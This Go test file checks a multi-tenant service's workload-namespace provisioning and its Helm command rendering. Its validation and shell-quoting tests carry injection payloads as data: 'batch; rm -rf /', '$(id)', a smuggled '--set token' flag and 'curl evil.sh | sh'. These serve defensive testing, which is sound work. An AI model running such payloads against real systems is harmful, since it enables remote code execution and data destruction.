// yscale:proprietary

package handlers

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/yscale-sh/yscale/central/internal/state"
)

// setNamespaces calls the operator route the way the mux does.
func setNamespaces(t *testing.T, tn *Tenants, tenantID, body string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(http.MethodPut,
		"/v1/admin/tenants/"+tenantID+"/workload-namespaces", strings.NewReader(body))
	req.SetPathValue("tenant_id", tenantID)
	rec := httptest.NewRecorder()
	tn.HandleSetWorkloadNamespaces(rec, req)
	return rec
}

func decodeNamespacesResult(t *testing.T, rec *httptest.ResponseRecorder) WorkloadNamespacesResult {
	t.Helper()
	var res WorkloadNamespacesResult
	if err := json.Unmarshal(rec.Body.Bytes(), &res); err != nil {
		t.Fatalf("decode result: %v (body %q)", err, rec.Body.String())
	}
	return res
}

// Provisioning is where the two namespace gates get their one shared list:
// what central authorizes a submission against, and what the connector's
// RBAC grants Secret reads in. They only work as defence in depth if the
// operator can't set one and forget the other.
func TestProvisionCarriesWorkloadNamespacesIntoBothGates(t *testing.T) {
	store := state.New()
	tn := newTenants(store)

	res, err := tn.Provision(ProvisionOpts{
		Email:              "pilot@acme.com",
		WorkloadNamespaces: []string{"ml-team-a", "ml-team-b"},
	})
	if err != nil {
		t.Fatalf("Provision: %v", err)
	}
	cust, err := store.CustomerByID(res.CustomerID)
	if err != nil {
		t.Fatal(err)
	}
	if got := strings.Join(cust.WorkloadNamespaces, ","); got != "ml-team-a,ml-team-b" {
		t.Errorf("stored namespaces = %q, want the provisioned pair", got)
	}
	if got := strings.Join(res.WorkloadNamespaces, ","); got != "ml-team-a,ml-team-b" {
		t.Errorf("result namespaces = %q, want the provisioned pair", got)
	}
	if !strings.Contains(res.AgentInstall, `--set 'rbac.allowedNamespaces={ml-team-a,ml-team-b}'`) {
		t.Errorf("install bundle does not scope the connector's Secret RBAC: %q", res.AgentInstall)
	}
	if res.ConnectorRBACSet != `--set 'rbac.allowedNamespaces={ml-team-a,ml-team-b}'` {
		t.Errorf("connector_rbac_set = %q", res.ConnectorRBACSet)
	}
}

// A tenant provisioned without any is fail-closed to "default", and says so
// rather than reporting an empty list the operator has to interpret.
func TestProvisionWithoutWorkloadNamespacesIsFailClosed(t *testing.T) {
	store := state.New()
	tn := newTenants(store)

	res, err := tn.Provision(ProvisionOpts{Email: "pilot@acme.com"})
	if err != nil {
		t.Fatalf("Provision: %v", err)
	}
	if len(res.WorkloadNamespaces) != 1 || res.WorkloadNamespaces[0] != "default" {
		t.Errorf("result namespaces = %v, want [default]", res.WorkloadNamespaces)
	}
	if !strings.Contains(res.AgentInstall, `--set 'rbac.allowedNamespaces={default}'`) {
		t.Errorf("install bundle should scope RBAC to default: %q", res.AgentInstall)
	}

	cust, err := store.CustomerByID(res.CustomerID)
	if err != nil {
		t.Fatal(err)
	}
	// Nothing stored: the fail-closed set is a resolution, not a write, so a
	// later operator change to the default doesn't silently skip this tenant.
	if len(cust.WorkloadNamespaces) != 0 {
		t.Errorf("stored namespaces = %v, want none", cust.WorkloadNamespaces)
	}
	if _, err := authorizeWorkloadNamespace(cust, "ml-team-a"); err == nil {
		t.Error("an unconfigured tenant accepted an arbitrary namespace")
	}
}

// The operator's durable path for a tenant that already exists. Provisioning is
// not when a tenant learns which namespaces it needs, and before this route the
// only ways to add one were a Postgres edit or re-provisioning the tenant.
func TestSetWorkloadNamespacesUpdatesAProvisionedTenant(t *testing.T) {
	store := state.New()
	tn := newTenants(store)

	res, err := tn.Provision(ProvisionOpts{Email: "pilot@acme.com", WorkloadNamespaces: []string{"ml-team-a"}})
	if err != nil {
		t.Fatalf("Provision: %v", err)
	}
	cust, _ := store.CustomerByID(res.CustomerID)
	if _, err := authorizeWorkloadNamespace(cust, "ml-team-b"); err == nil {
		t.Fatal("team-b was authorized before it was added")
	}

	rec := setNamespaces(t, tn, res.CustomerID, `{"workload_namespaces":["ml-team-a","ml-team-b"]}`)
	if rec.Code != http.StatusOK {
		t.Fatalf("update = %d, want 200 (body %q)", rec.Code, rec.Body.String())
	}
	got := decodeNamespacesResult(t, rec)
	if strings.Join(got.WorkloadNamespaces, ",") != "ml-team-a,ml-team-b" {
		t.Errorf("resolved set = %v", got.WorkloadNamespaces)
	}
	// Central is one gate; the connector's RBAC is the other and lives in the
	// customer's cluster. The response has to say so, with the flag and the
	// command — an operator who stops at the 200 leaves the two disagreeing.
	if got.ConnectorRBACSet != `--set 'rbac.allowedNamespaces={ml-team-a,ml-team-b}'` {
		t.Errorf("connector_rbac_set = %q", got.ConnectorRBACSet)
	}
	if !strings.Contains(got.ConnectorUpgrade, "helm upgrade yscale-agent") ||
		!strings.Contains(got.ConnectorUpgrade, got.ConnectorRBACSet) {
		t.Errorf("connector_upgrade is not a runnable upgrade carrying the flag: %q", got.ConnectorUpgrade)
	}
	if !strings.Contains(got.ConnectorActionRequired, "rbac.allowedNamespaces") {
		t.Errorf("connector_action_required does not name the value to sync: %q", got.ConnectorActionRequired)
	}

	// Durable, and live for the next submission.
	cust, err = store.CustomerByID(res.CustomerID)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Join(cust.WorkloadNamespaces, ",") != "ml-team-a,ml-team-b" {
		t.Errorf("stored namespaces = %v", cust.WorkloadNamespaces)
	}
	if _, err := authorizeWorkloadNamespace(cust, "ml-team-b"); err != nil {
		t.Errorf("newly authorized namespace still refused: %v", err)
	}
	// A replacement, not an append: removing a team has to be sayable.
	if rec := setNamespaces(t, tn, res.CustomerID, `{"workload_namespaces":["ml-team-b"]}`); rec.Code != http.StatusOK {
		t.Fatalf("narrowing update = %d (body %q)", rec.Code, rec.Body.String())
	}
	cust, _ = store.CustomerByID(res.CustomerID)
	if strings.Join(cust.WorkloadNamespaces, ",") != "ml-team-b" {
		t.Errorf("after narrowing, stored = %v, want [ml-team-b]", cust.WorkloadNamespaces)
	}
	if _, err := authorizeWorkloadNamespace(cust, "ml-team-a"); err == nil {
		t.Error("a removed namespace is still authorized")
	}
}

// A tenant seeded from env config (CUSTn_ID/CUSTn_TOKEN, and the dev seed)
// never went through Provision, so this route is the ONLY way it ever gets a
// namespace. And the seed re-runs on every boot from config that knows nothing
// about the update — so the update has to survive it.
func TestSetWorkloadNamespacesUpdatesAnEnvSeededTenant(t *testing.T) {
	store := state.New()
	tn := newTenants(store)
	store.AddCustomer(&state.Customer{ID: "cust_seeded", Token: "tok_seed", Plan: "pro"})

	rec := setNamespaces(t, tn, "cust_seeded", `{"workload_namespaces":["batch"]}`)
	if rec.Code != http.StatusOK {
		t.Fatalf("update = %d, want 200 (body %q)", rec.Code, rec.Body.String())
	}

	// The boot seed, re-driven from the same env config.
	store.AddCustomer(&state.Customer{ID: "cust_seeded", Token: "tok_seed", Plan: "pro"})

	cust, err := store.CustomerByID("cust_seeded")
	if err != nil {
		t.Fatal(err)
	}
	if strings.Join(cust.WorkloadNamespaces, ",") != "batch" {
		t.Errorf("re-seeding reverted the operator's namespaces: %v", cust.WorkloadNamespaces)
	}
	if _, err := authorizeWorkloadNamespace(cust, "batch"); err != nil {
		t.Errorf("seeded tenant lost its authorization: %v", err)
	}
}

// Every one of these reaches the store as a tenant's authorization set AND a
// shell command an operator pastes. None of them may get that far.
func TestSetWorkloadNamespacesRefusesMalformedInput(t *testing.T) {
	cases := []struct {
		name, body string
	}{
		{"empty list", `{"workload_namespaces":[]}`},
		{"absent field", `{}`},
		{"empty entry", `{"workload_namespaces":["batch",""]}`},
		{"comma-joined", `{"workload_namespaces":["batch,kube-system"]}`},
		{"double quote", `{"workload_namespaces":["batch\"}"]}`},
		{"single quote", `{"workload_namespaces":["batch'"]}`},
		{"command separator", `{"workload_namespaces":["batch; rm -rf /"]}`},
		{"command substitution", `{"workload_namespaces":["$(id)"]}`},
		{"brace escape", `{"workload_namespaces":["batch} --set token=x --set foo={y"]}`},
		{"leading dash", `{"workload_namespaces":["-batch"]}`},
		{"uppercase", `{"workload_namespaces":["Batch"]}`},
		{"duplicate", `{"workload_namespaces":["batch","batch"]}`},
		{"too long", `{"workload_namespaces":["` + strings.Repeat("b", 64) + `"]}`},
		{"not JSON", `workload_namespaces: [batch]`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			store := state.New()
			tn := newTenants(store)
			store.AddCustomer(&state.Customer{ID: "cust_v", Token: "tok_v", Plan: "pro",
				WorkloadNamespaces: []string{"batch"}})

			rec := setNamespaces(t, tn, "cust_v", tc.body)
			if rec.Code != http.StatusBadRequest {
				t.Fatalf("update = %d, want 400 (body %q)", rec.Code, rec.Body.String())
			}
			cust, _ := store.CustomerByID("cust_v")
			if strings.Join(cust.WorkloadNamespaces, ",") != "batch" {
				t.Errorf("a refused update still wrote %v", cust.WorkloadNamespaces)
			}
		})
	}
}

// The same list on the provisioning side, refused before the tenant exists —
// there is no half-provisioned tenant carrying an unusable authorization set,
// and the status is 400 rather than the id-collision 409 this call otherwise
// answers.
func TestProvisionRefusesMalformedWorkloadNamespaces(t *testing.T) {
	for _, ns := range [][]string{
		{"batch,kube-system"},
		{"batch", ""},
		{"batch'; helm install evil"},
		{"batch", "batch"},
		{"KUBE-SYSTEM"},
	} {
		store := state.New()
		tn := newTenants(store)

		res, err := tn.Provision(ProvisionOpts{ID: "cust_bad", Email: "p@acme.com", WorkloadNamespaces: ns})
		if err == nil {
			t.Fatalf("Provision(%v) succeeded: %+v", ns, res)
		}
		if got := provisionStatus(err); got != http.StatusBadRequest {
			t.Errorf("Provision(%v) status = %d, want 400 (%v)", ns, got, err)
		}
		if _, err := store.CustomerByID("cust_bad"); err == nil {
			t.Errorf("Provision(%v) created a tenant anyway", ns)
		}
	}
}

// An unknown or revoked tenant is 404, and nothing about the request is
// reflected back.
func TestSetWorkloadNamespacesRefusesUnknownAndRevokedTenants(t *testing.T) {
	store := state.New()
	tn := newTenants(store)
	store.AddCustomer(&state.Customer{ID: "cust_gone", Token: "tok_gone", Plan: "pro"})
	if err := store.RevokeCustomer("cust_gone"); err != nil {
		t.Fatal(err)
	}

	for _, id := range []string{"cust_missing", "cust_gone"} {
		rec := setNamespaces(t, tn, id, `{"workload_namespaces":["batch"]}`)
		if rec.Code != http.StatusNotFound {
			t.Errorf("update %s = %d, want 404 (body %q)", id, rec.Code, rec.Body.String())
		}
	}
}

// A replacement that drops a hosted assignment's reserved namespace is a
// conflict with the standing assignment, not a validation error: the 409 names
// the namespace, nothing is written, and the same list with the namespace kept
// is the supported edit.
func TestSetWorkloadNamespacesRefusesDroppingHostedReservedNamespace(t *testing.T) {
	store := state.New()
	tn := newTenants(store)
	store.AddCustomer(&state.Customer{ID: "cust_hosted", Token: "tok_h", Plan: "pro",
		WorkloadNamespaces: []string{"batch"}})
	if _, _, err := store.AssignHostedCluster("cust_hosted", "hosted-1", "", "ten-hosted", state.OperatorActor()); err != nil {
		t.Fatalf("AssignHostedCluster: %v", err)
	}

	rec := setNamespaces(t, tn, "cust_hosted", `{"workload_namespaces":["batch","team-b"]}`)
	if rec.Code != http.StatusConflict || !strings.Contains(rec.Body.String(), "ten-hosted") {
		t.Fatalf("update = %d, want 409 naming the reserved namespace (body %q)", rec.Code, rec.Body.String())
	}
	cust, err := store.CustomerByID("cust_hosted")
	if err != nil {
		t.Fatal(err)
	}
	if strings.Join(cust.WorkloadNamespaces, ",") != "batch,ten-hosted" {
		t.Errorf("a refused update still wrote %v", cust.WorkloadNamespaces)
	}

	rec = setNamespaces(t, tn, "cust_hosted", `{"workload_namespaces":["batch","team-b","ten-hosted"]}`)
	if rec.Code != http.StatusOK {
		t.Fatalf("update keeping the reserved namespace = %d (body %q)", rec.Code, rec.Body.String())
	}
	got := decodeNamespacesResult(t, rec)
	if strings.Join(got.WorkloadNamespaces, ",") != "batch,team-b,ten-hosted" {
		t.Errorf("resolved set = %v", got.WorkloadNamespaces)
	}
}

// The install and upgrade commands are pasted into a root shell against the
// customer's cluster. The endpoint is operator config that nothing else
// validates, so the render quotes rather than trusting its input.
func TestRenderedHelmCommandsCannotBeShellInjected(t *testing.T) {
	// The payload closes the quote, runs a command and reopens it. Rendered
	// correctly it is one inert argument: every embedded quote comes back as
	// '\'', so nothing in it is ever outside single quotes.
	got := agentInstallCommand(`ws://x'; curl evil.sh | sh; echo '`, "ysk_abc", []string{"batch"})
	if !strings.Contains(got, `--set endpoint='ws://x'\''; curl evil.sh | sh; echo '\'''`) {
		t.Errorf("endpoint was not shell-quoted: %q", got)
	}
	if unquoted := strings.Count(got, "'") % 2; unquoted != 0 {
		t.Errorf("rendered command has an unbalanced quote: %q", got)
	}
	if !strings.Contains(got, "--set token='ysk_abc'") {
		t.Errorf("token was not shell-quoted: %q", got)
	}
	if !strings.Contains(agentUpgradeCommand([]string{"batch"}), `--set 'rbac.allowedNamespaces={batch}'`) {
		t.Errorf("upgrade command lost the RBAC flag: %q", agentUpgradeCommand([]string{"batch"}))
	}
}
